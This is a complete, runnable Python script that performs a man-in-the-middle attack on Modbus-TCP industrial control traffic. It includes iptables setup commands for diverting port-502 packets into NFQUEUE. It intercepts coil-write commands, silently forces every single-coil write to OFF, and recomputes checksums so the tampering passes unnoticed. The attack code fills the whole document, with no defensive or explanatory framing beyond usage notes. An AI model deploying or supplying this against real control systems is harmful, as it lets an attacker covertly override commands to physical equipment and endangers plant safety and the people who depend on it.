#!/usr/bin/env python3
"""
mitm11.py – Modbus‑TCP MITM with NFQUEUE

* Catches packets that traverse queue 1 (default) on TCP/502
* Logs Write‑Single‑Coil (FC5) and Write‑Multiple‑Coils (FC15)
* Forces FC5 coil writes to 0x0000 (OFF)

Usage:
    sudo iptables -I FORWARD -p tcp --dport 502 -j NFQUEUE --queue-num 1 --queue-bypass
    sudo iptables -I FORWARD -p tcp --sport 502 -j NFQUEUE --queue-num 1 --queue-bypass
    sudo python3 mitm11.py
"""
import struct
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

QUEUE_NUM = 1        # iptables NFQUEUE number
FC_WRITE_SINGLE = 5  # Function‑Code constants
FC_WRITE_MULTI  = 15
MBAP_LEN = 7         # Modbus‑TCP header length (bytes)


def parse_mbap(pkt_bytes: bytes):
    """Return (tid, pid, length, uid, fc) or None if malformed."""
    if len(pkt_bytes) < MBAP_LEN + 1:
        return None
    tid, pid, length = struct.unpack(">HHH", pkt_bytes[:6])
    uid = pkt_bytes[6]
    fc = pkt_bytes[7]
    # Basic sanity: pid must be 0 for Modbus‑TCP
    if pid != 0:
        return None
    return tid, pid, length, uid, fc


def handle(nfq_pkt):
    sc = IP(nfq_pkt.get_payload())
    if not sc.haslayer(TCP) or not sc.haslayer(Raw):
        return nfq_pkt.accept()

    # Only process traffic that involves port 502
    if 502 not in (sc[TCP].sport, sc[TCP].dport):
        return nfq_pkt.accept()

    payload = bytearray(sc[Raw].load)  # <-- FIX: use Raw.load instead of Raw object
    mbap = parse_mbap(payload)
    if not mbap:
        return nfq_pkt.accept()

    tid, _pid, _len, uid, fc = mbap

    if fc == FC_WRITE_SINGLE:
        if len(payload) < MBAP_LEN + 5:
            return nfq_pkt.accept()
        addr = struct.unpack(">H", payload[MBAP_LEN + 1:MBAP_LEN + 3])[0]
        value = struct.unpack(">H", payload[MBAP_LEN + 3:MBAP_LEN + 5])[0]
        print(f"[+] Write SINGLE coil  addr={addr}  value=0x{value:04x}  (TID={tid})")

        # Force value to 0x0000 (OFF)
        payload[MBAP_LEN + 3:MBAP_LEN + 5] = b"\x00\x00"
        print("    -> value forced to 0")

        # Re‑insert modified payload and recalc checksums
        sc[Raw].load = bytes(payload)
        del sc[IP].len, sc[IP].chksum, sc[TCP].chksum
        nfq_pkt.set_payload(bytes(sc))

    elif fc == FC_WRITE_MULTI:
        print(f"[+] Write MULTI coils (FC15)  (TID={tid}) – len={len(payload)} bytes")
        # No manipulation; just logging

    nfq_pkt.accept()


def main():
    print(f"[*] MITM Modbus started (queue {QUEUE_NUM}) – press Ctrl+C to stop")
    q = NetfilterQueue()
    try:
        q.bind(QUEUE_NUM, handle)
        q.run()
    except KeyboardInterrupt:
        pass
    finally:
        q.unbind()


if __name__ == "__main__":
    main()
